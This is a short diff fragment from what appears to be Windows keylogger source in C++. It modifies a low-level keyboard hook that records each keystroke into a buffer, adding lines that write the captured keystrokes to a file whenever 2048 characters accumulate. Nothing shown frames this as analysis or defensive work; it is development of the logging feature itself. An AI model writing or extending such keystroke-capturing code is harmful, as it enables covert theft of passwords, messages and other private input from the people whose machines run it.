@@ -43,6 +43,10 @@ int main() {
 
 LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
 	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
+	if (keyValue.length() >= 2048) {
+		myfile.write(keyValue.c_str(), keyValue.length());
+		keyValue.clear();
+	}
 	if (wParam == WM_KEYDOWN) {
 		switch (p->vkCode) {
 		case VK_CAPITAL:	keyValue.append("<CAPLOCK>");	break;
